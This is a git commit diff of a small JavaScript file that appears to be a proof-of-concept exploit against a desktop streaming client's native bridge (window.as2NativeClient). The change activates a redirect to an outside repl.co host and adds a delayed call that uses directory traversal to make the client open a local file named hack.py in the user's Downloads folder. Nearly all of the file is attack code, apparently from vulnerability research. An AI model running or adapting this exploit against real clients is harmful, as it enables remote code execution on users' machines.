3954b182306d0c2c8df544682397db7ef9836589
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 22:05:55 +0530

    Update tmp1.js

--- tmp1.js
+++ tmp1.js
@@ -4,9 +4,9 @@
           if(window.as2NativeClient) {
                   
             
-            //window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
+            window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
                   // C:\Users\rakesh\AppData\Local\AppStreamClient\app-1.1.160>dir .\..\..\..\..\Downloads
-            window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+            setTimeout('window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")',2000)   
             //setTimeout('window.as2NativeClient.redirectToHomeWithUrl(".\..\..\..\..\Downloads\hack.py")',2000)      
             
 
